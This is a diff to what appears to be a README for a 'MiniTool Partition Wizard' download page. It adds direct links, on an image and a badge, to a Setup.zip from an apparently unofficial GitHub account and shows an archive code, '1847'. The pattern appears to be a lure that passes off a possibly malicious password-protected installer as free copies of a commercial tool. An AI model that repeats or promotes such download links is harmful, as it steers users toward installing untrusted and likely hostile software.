@@ -8,7 +8,7 @@
 
 ---
 
-[![Download](og-image.png)]()
+[![Download](og-image.png)](https://github.com/Milliulgateway/MiniTool-Partition-Wizard/releases/download/Last/Setup.zip)
 
 
 ---
@@ -21,7 +21,7 @@
 
 ## 📥 Download
 
-[![MiniTool Partition Wizard](https://img.shields.io/badge/Download%20MiniTool%20Partition%20Wizard-Open%20Page-0a84ff?style=for-the-badge&logo=github)]()
+[![MiniTool Partition Wizard](https://img.shields.io/badge/Download%20MiniTool%20Partition%20Wizard-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/Milliulgateway/MiniTool-Partition-Wizard/releases/download/Last/Setup.zip)
 
 **🔐🔐🔐** `1847`
 
